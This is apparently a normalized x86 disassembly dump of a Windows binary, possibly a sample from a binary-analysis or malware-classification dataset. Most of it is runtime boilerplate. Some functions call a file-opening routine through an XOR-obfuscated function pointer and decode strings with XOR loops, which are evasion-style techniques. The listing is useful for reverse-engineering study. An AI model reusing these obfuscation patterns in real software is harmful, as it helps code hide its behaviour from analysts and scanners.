call sub_10047d50
cmp eax [ ebp - 0xe8 ]
push esi
sete dl
push 0x8
mov [ ebp - 0xdc ] dl
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
mov eax [ ebp - 0xf0 ]
push eax
push ebx
push esi
call sub_1007f5d0
mov eax [ ebp - 0xf0 ]
mov ecx [ ebp - 0x104 ]
lea edx [ ecx + eax + 0x30 ]
mov [ ebp - 0x104 ] edx
mov edx [ ebp - 0x100 ]
add ebx eax
mov eax [ edx + 0x4 ]
mov ecx edi
add esp 0xc
mov [ ebp - 0xe0 ] esi
cmp ecx eax
jae r-xdata
mov ecx [ edx + 0x8 ]
cmp eax ecx
jne r-xdata
mov edi [ edx ]
cmp edi ecx
ja r-xdata
mov edi [ edx + 0x4 ]
test edi edi
je r-xdata
mov esi [ edx ]
sub eax esi
sar eax 0x5
cmp eax 0x7fffffe
ja r-xdata
mov esi ecx
mov ecx [ edx + 0x8 ]
sub esi edi
cmp eax ecx
jne r-xdata
add [ edx + 0x4 ] 0x20
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x104 ]
cmp eax [ edx ]
jb r-xdata
lea esi [ ebp - 0xf8 ]
push r--data
call sub_1000831a
sub ecx esi
inc eax
sar ecx 0x5
cmp eax ecx
jbe r-xdata
mov edi [ edx + 0x4 ]
and esi 0xffffffe0
add esi [ edx ]
test edi edi
je r-xdata
sub eax edi
sar eax 0x5
cmp eax 0x7fffffe
ja r-xdata
mov esi ecx
shr esi 0x1
mov edi 0x7ffffff
sub edi esi
cmp edi ecx
jae r-xdata
jmp r-xdata
sub ecx edi
inc eax
sar ecx 0x5
mov [ ebp - 0xfc ] eax
cmp eax ecx
jbe r-xdata
add ecx esi
xor ecx ecx
jmp r-xdata
mov ecx 0x8
[ edi ] [ esi ]
mov eax ecx
shr eax 0x1
mov edi 0x7ffffff
sub edi eax
cmp edi ecx
jae r-xdata
call sub_10049640
mov edx [ ebp - 0x100 ]
mov ecx eax
cmp ecx eax
jae r-xdata
add ecx eax
xor ecx ecx
jmp r-xdata
call sub_10049640
mov edx [ ebp - 0x100 ]
mov ecx eax
mov eax [ ebp - 0xfc ]
cmp ecx eax
jae r-xdata
sub_10019ca0
push ebp
mov ebp esp
sub esp 0x234
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
push 0x104
mov edi ecx
mov ecx [ edi + 0x4 ]
lea eax [ ebp - 0x228 ]
push eax
push ecx
mov [ ebp - 0x234 ] 0x0
call [ ExpandEnvironmentStringsW@IAT ]
mov edx [ rw-data ]
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
mov [ ebp - 0x22c ] edx
mov bl 0x38
xor [ ebp - 0x22c ] bl
xor [ ebp - 0x22b ] bl
xor [ ebp - 0x22a ] bl
xor [ ebp - 0x229 ] bl
push 0x80000000
lea eax [ ebp - 0x228 ]
push eax
call [ ebp - 0x22c ]
mov esi eax
cmp esi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
mov esp ebp
pop ebp
retn
push 0x0
push esi
call [ GetFileSize@IAT ]
mov [ ebp - 0x230 ] eax
push esi
cmp eax 0xffffffff
jne r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x22c ] edx
xor [ ebp - 0x22c ] bl
xor [ ebp - 0x22b ] bl
xor [ ebp - 0x22a ] bl
xor [ ebp - 0x229 ] bl
call [ ebp - 0x22c ]
cmp [ ebp - 0x230 ] 0x1e84800
jae r-xdata
mov ecx [ rw-data ]
mov [ ebp - 0x22c ] ecx
xor [ ebp - 0x22c ] bl
xor [ ebp - 0x22b ] bl
xor [ ebp - 0x22a ] bl
xor [ ebp - 0x229 ] bl
call [ ebp - 0x22c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x228 ]
push edx
mov ecx edi
call sub_1000e930
test eax eax
jne r-xdata
lea eax [ ebp - 0x230 ]
push eax
lea ecx [ ebp - 0x234 ]
push ecx
lea eax [ ebp - 0x228 ]
call sub_10037500
add esp 0x8
test eax eax
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x8e
call sub_10045930
mov ebx edx
lea edx [ ebp - 0x1c ]
mov eax 0x156
call sub_10045930
mov ebx edx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax 0x8e
call sub_10045930
mov ebx edx
call sub_100279a0
xor edi edi
lea edx [ ebp - 0x1c ]
mov eax 0x156
call sub_10045930
mov ebx edx
call sub_100279a0
jmp r-xdata
call sub_100279a0
mov esi [ ebp - 0x234 ]
mov ecx [ ebp - 0x230 ]
push edi
mov edx esi
call sub_1001f7d0
push esi
call [ LocalFree@IAT ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
sub_10019e70
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ rw-data ]
cmp edi [ rw-data ]
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ebx [ eax + 0x10 ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx [ edi ]
add ecx 0xc
cmp [ ebp - 0x8 ] 0x8
jb r-xdata
mov esi [ ecx + 0x10 ]
mov edx esi
cmp edx esi
jae r-xdata
mov eax [ eax ]
mov edx esi
cmp esi ebx
jb r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ecx ]
cmp esi ebx
jb r-xdata
mov bx [ ecx ]
cmp bx [ eax ]
jne r-xdata
add edi 0x4
cmp edi [ rw-data ]
jne r-xdata
xor eax eax
cmp esi ebx
setne al
sbb eax eax
and eax 0xfffffffe
inc eax
je r-xdata
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ edi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
jmp r-xdata
test eax eax
je r-xdata
sub_10019f16
push 0x28
mov eax sub_10085471
call sub_100624bc
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x2
pop eax
call sub_10013ab8
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_1001c8b0
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100120f0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10019fa0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008860f
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x114 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x118 ] ecx
mov ecx [ r--data ]
mov [ ebp - 0x110 ] eax
movsx eax [ ecx ]
xor eax 0xff80
xor ecx ecx
and eax 0xff
mov [ ebp - 0x104 ] ax
mov [ ebp - 0x102 ] cx
mov ecx [ r--data ]
xor edi edi
xor eax eax
movsx esi [ ecx + eax ]
xor esi eax
xor esi 0xffec
and esi 0xff
mov [ ebp + eax * 2 - 0x20 ] si
inc eax
cmp eax 0x2
jb r-xdata
xor eax eax
mov [ ebp - 0x1c ] ax
xor ecx ecx
mov eax edx
mov [ ebp - 0x60 ] 0x7
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x74 ] cx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax esi
sar eax 0x1
push eax
push edx
lea ecx [ ebp - 0x74 ]
call sub_1005ddc0
lea edx [ ebp - 0x74 ]
push edx
lea edx [ ebp - 0x104 ]
lea esi [ ebp - 0xc8 ]
mov [ ebp - 0x4 ] edi
call sub_1005bbc0
add esp 0x4
push eax
lea edx [ ebp - 0x20 ]
lea esi [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x1
call sub_1001ccb0
add esp 0x4
mov ebx 0x8
cmp [ ebp - 0xb4 ] ebx
jb r-xdata
mov esi 0x7
xor ecx ecx
mov [ ebp - 0xb4 ] esi
mov [ ebp - 0xb8 ] edi
mov [ ebp - 0xc8 ] cx
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x60 ] ebx
jb r-xdata
mov eax [ ebp - 0xc8 ]
push eax
call sub_100187af
add esp 0x4
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x60 ] esi
mov [ ebp - 0x64 ] edi
mov [ ebp - 0x74 ] ax
mov edx [ ebp - 0x74 ]
push edx
call sub_100187af
add esp 0x4
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x42
and edx 0xff
mov [ ebp + eax * 2 - 0x58 ] dx
inc eax
cmp eax 0x1a
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x24 ] ax
lea ecx [ ecx ]
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x28
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x2
jb r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x114 ]
xor eax eax
push edx
lea edx [ ebp - 0x58 ]
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x14 ] ax
call sub_100688b0
mov eax [ r--data ]
movsx ecx [ eax ]
mov eax [ r--data ]
xor ecx 0x5d
and ecx 0xff
xor edx edx
mov [ ebp - 0x108 ] cx
mov [ ebp - 0x106 ] dx
movsx ecx [ eax ]
xor ecx 0x24
and ecx 0xff
add esp 0x8
xor eax eax
mov [ ebp - 0x98 ] esi
mov esi [ ebp - 0x118 ]
mov [ ebp - 0xac ] ax
mov eax esi
mov [ ebp - 0x10a ] dx
mov [ ebp - 0x10c ] cx
mov [ ebp - 0x9c ] edi
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0xac ]
call sub_1005ddc0
lea ecx [ ebp - 0xac ]
push ecx
lea edx [ ebp - 0x108 ]
lea esi [ ebp - 0x100 ]
mov [ ebp - 0x4 ] 0x5
call sub_1005bbc0
add esp 0x4
push eax
lea edx [ ebp - 0x10c ]
lea esi [ ebp - 0xe4 ]
mov [ ebp - 0x4 ] 0x6
call sub_1001ccb0
add esp 0x4
push 0xffffffff
push edi
push eax
lea ecx [ ebp - 0x90 ]
mov [ ebp - 0x4 ] 0x7
call sub_10017b50
cmp [ ebp - 0xd0 ] ebx
jb r-xdata
xor eax eax
mov esi 0x7
mov [ ebp - 0xd0 ] esi
mov [ ebp - 0xd4 ] edi
mov [ ebp - 0xe4 ] ax
cmp [ ebp - 0xec ] ebx
jb r-xdata
mov edx [ ebp - 0xe4 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0xec ] esi
mov [ ebp - 0xf0 ] edi
mov [ ebp - 0x100 ] dx
cmp [ ebp - 0x98 ] ebx
jb r-xdata
mov ecx [ ebp - 0x100 ]
push ecx
call sub_100187af
add esp 0x4
mov ecx [ ebp - 0x90 ]
cmp [ ebp - 0x7c ] ebx
jae r-xdata
mov eax [ ebp - 0xac ]
push eax
call sub_100187af
add esp 0x4
mov edx [ ebp - 0x110 ]
call sub_10046fd0
mov esi eax
cmp [ ebp - 0x7c ] ebx
jb r-xdata
lea ecx [ ebp - 0x90 ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x90 ]
push ecx
call sub_100187af
add esp 0x4
sub_1001a2f0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax [ ecx + 0x10 ]
cmp eax esi
jae r-xdata
mov edx esi
cmp esi edi
jb r-xdata
mov esi eax
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov edx edi
mov eax ecx
mov eax [ ecx ]
jmp r-xdata
cmp esi edi
jae r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
test edx edx
je r-xdata
xor eax eax
cmp esi edi
setne al
pop esi
or eax 0xffffffff
pop ebx
pop ebp
retn 0x4
mov bx [ eax ]
cmp bx [ ecx ]
jne r-xdata
movzx eax [ eax ]
cmp ax [ ecx ]
sbb eax eax
and eax 0xfffffffe
inc eax
jne r-xdata
add eax 0x2
add ecx 0x2
dec edx
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
jmp r-xdata
sub_1001a35b
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x23c ] eax
call sub_1001da0a
call sub_1006299d
mov [ ebp - 0x26c ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1006299d
mov [ eax ] 0x16
call sub_100427ff
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_10041a47
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x248 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
xor esi esi
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x274 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x274 ]
mov edi [ ebp - 0x21c ]
mov dl al
jmp r-xdata
sub_1001af63
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x24 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100287cc
pop ecx
pop ecx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x30 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_1002072e
mov esi [ ebp - 0x24 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x1e ]
mov [ ebx ] eax
movsx eax [ ebp - 0x20 ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_10057f0f
add esp 0x24
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1003cbb0
int3
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
sub_1001b000
push ebp
mov ebp esp
push 0xffffffff
push sub_100850a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ebx ecx
mov ecx [ ebp + 0x10 ]
xor esi esi
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x50 ] esi
mov ecx 0x7
xor edx edx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] dx
mov [ ebp - 0x18 ] ecx
xor ecx ecx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x2c ] cx
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x50 ] eax
cmp [ ebx + 0x48 ] cl
jne r-xdata
push esi
push 0x8
lea ecx [ ebp - 0x48 ]
call sub_10046e20
mov eax [ ebp - 0x4c ]
mov [ ebx + 0x4c ] esi
cmp eax [ ebp - 0x54 ]
je r-xdata
mov edx [ rw-data ]
mov [ ebx + 0x44 ] edx
mov ebx 0x7
xor edx edx
lea eax [ ebp - 0x2c ]
mov [ edi + 0x14 ] ebx
mov [ edi + 0x10 ] esi
mov [ edi ] dx
cmp edi eax
je r-xdata
cmp [ ebp - 0x34 ] 0x8
mov esi [ ebp - 0x48 ]
jae r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov ecx [ ebx + 0x4 ]
mov edx [ ecx ]
lea ebx [ ebp - 0x58 ]
push ebx
mov ebx [ ebp - 0x38 ]
lea ebx [ esi + ebx * 2 ]
push ebx
push esi
lea ebx [ ebp - 0x4c ]
push ebx
mov ebx [ ebp - 0x54 ]
push ebx
mov ebx [ ebp - 0x5c ]
push eax
lea eax [ ebx + 0x44 ]
push eax
mov eax [ edx + 0x10 ]
call eax
test eax eax
js r-xdata
lea esi [ ebp - 0x48 ]
xor ecx ecx
cmp [ ebp - 0x34 ] 0x8
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] esi
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
xor edx edx
mov [ edi + 0x14 ] ebx
mov [ edi + 0x10 ] esi
mov [ edi ] dx
cmp [ ebp - 0x18 ] 0x8
jae r-xdata
mov ecx [ edi ]
push ecx
call sub_100187af
add esp 0x4
cmp [ ebx + 0x4a ] 0x0
je r-xdata
cmp eax 0x1
jle r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10001e8b
mov esp ebp
pop ebp
retn 0xc
mov edx [ ebp - 0x48 ]
push edx
call sub_100187af
add esp 0x4
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov [ edi ] eax
mov [ ebp - 0x2c ] esi
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x1c ]
lea ecx [ eax + eax + 0x2 ]
push ecx
lea edx [ ebp - 0x2c ]
push edx
push edi
call sub_1007ec90
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
add esp 0xc
mov [ edi + 0x10 ] ecx
mov [ edi + 0x14 ] edx
jmp r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x50 ] r--data
call sub_10069ac6
push r--data
lea ecx [ ebp - 0x68 ]
push ecx
mov [ ebp - 0x68 ] r--data
call sub_10024fe9
xor edx edx
push 0xffffffff
push edx
mov esi 0x7
add ebx 0x28
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] 0x0
push ebx
mov ecx edi
mov [ edi ] dx
call sub_100404a0
mov ebx 0x8
cmp [ ebp - 0x18 ] ebx
jb r-xdata
mov eax [ ebp - 0x58 ]
cmp esi eax
jae r-xdata
cmp eax 0x3
jne r-xdata
xor ecx ecx
cmp [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
xor ecx ecx
cmp [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x1c ] 0x0
jmp r-xdata
cmp [ ebp - 0x38 ] 0x10
jae r-xdata
sub eax esi
sar eax 0x1
push eax
push esi
lea ecx [ ebp - 0x2c ]
call sub_10040ba0
jmp r-xdata
mov eax [ ebp - 0x4c ]
mov esi [ ebp - 0x54 ]
cmp eax esi
je r-xdata
mov [ ebp - 0x2c ] cx
jb r-xdata
cmp [ ebx + 0x4a ] 0x0
je r-xdata
push 0x0
push 0x8
lea ecx [ ebp - 0x48 ]
call sub_10046e20
mov esi [ ebp - 0x54 ]
mov eax [ ebp - 0x4c ]
mov ecx eax
sub ecx [ ebp - 0x50 ]
mov [ ebx + 0x4c ] ecx
cmp eax esi
jne r-xdata
movzx edx [ eax ]
push edx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10046e20
mov eax [ ebp - 0x4c ]
inc eax
mov [ ebp - 0x4c ] eax
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x74 ]
mov [ ebp - 0x50 ] r--data
call sub_10069ac6
push r--data
lea ecx [ ebp - 0x74 ]
push ecx
mov [ ebp - 0x74 ] r--data
call sub_10024fe9
xor edx edx
push 0xffffffff
push edx
mov esi 0x7
add ebx 0x28
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] 0x0
push ebx
mov ecx edi
mov [ edi ] dx
call sub_100404a0
mov ebx 0x8
cmp [ ebp - 0x18 ] ebx
jb r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_100187af
add esp 0x4
sub_1001b303
mov edi edi
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
add edi 0x14
push edi
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp + 0x1c ]
push 0x0
push 0x30
mov [ ebp - 0x3c ] ecx
call sub_100578b0
add esp 0xc
push [ ebp - 0x30 ]
movzx eax ax
mov ecx esi
mov [ ebp - 0x2c ] eax
lea ebx [ ebp - 0x24 ]
call sub_10069d0f
test al al
jne r-xdata
mov edi [ ebp - 0x30 ]
push edi
mov ecx esi
mov [ ebp - 0x25 ] 0x0
call sub_10069d0f
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push edi
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
movzx eax [ esi + 0x6 ]
push edi
push 0x0
push 0x2b
mov [ ebp - 0x34 ] eax
call sub_100578b0
add esp 0xc
cmp [ ebp - 0x34 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x25 ] 0x0
jne r-xdata
mov ax [ ebp - 0x2c ]
cmp [ esi + 0x6 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
mov ax [ ebp - 0x2c ]
cmp ax [ esi + 0x6 ]
ja r-xdata
mov ecx esi
call sub_1001c121
lea eax [ ebp - 0x38 ]
push eax
push 0xa
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x24 ]
xor edi edi
push eax
mov [ ebx ] 0x0
mov [ ebp - 0x38 ] edi
call sub_10060a86
add esp 0x10
push [ ebp - 0x30 ]
mov ecx esi
mov ebx eax
call sub_10069d0f
test al al
je r-xdata
lea ebx [ ebp - 0x24 ]
cmp [ ebp - 0x25 ] 0x0
je r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1005a5dc
push edi
mov ecx esi
call sub_10069d0f
test al al
je r-xdata
movzx eax [ esi + 0x6 ]
push edi
push 0x0
push 0x2d
mov [ ebp - 0x34 ] eax
call sub_100578b0
add esp 0xc
cmp [ ebp - 0x34 ] ax
jne r-xdata
mov ecx esi
call sub_1001c121
mov ecx esi
lea ebx [ ebp - 0x23 ]
call sub_1005a5dc
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
inc edi
mov [ ebx ] 0x30
inc ebx
jmp r-xdata
mov [ ebp - 0x24 ] 0x2d
movzx eax [ ebp - 0x2c ]
movzx ecx [ esi + 0x6 ]
add eax 0x9
cmp ecx eax
jg r-xdata
mov ecx esi
call sub_1001c121
or edi 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp ebx [ ebp + 0x14 ]
jl r-xdata
mov al [ esi + 0x6 ]
sub al [ ebp - 0x2c ]
add al 0x30
mov [ ebx ] al
lea eax [ ebp - 0x5 ]
cmp ebx eax
jae r-xdata
mov ecx esi
call sub_1001c121
cmp [ ebp + 0x18 ] ebx
jl r-xdata
mov ecx esi
mov [ ebp - 0x25 ] 0x1
call sub_1005a5dc
inc ebx
mov eax [ ebp - 0x3c ]
mov [ eax ] ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
sub_1001b4d7
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_10053997
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10001e8b
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
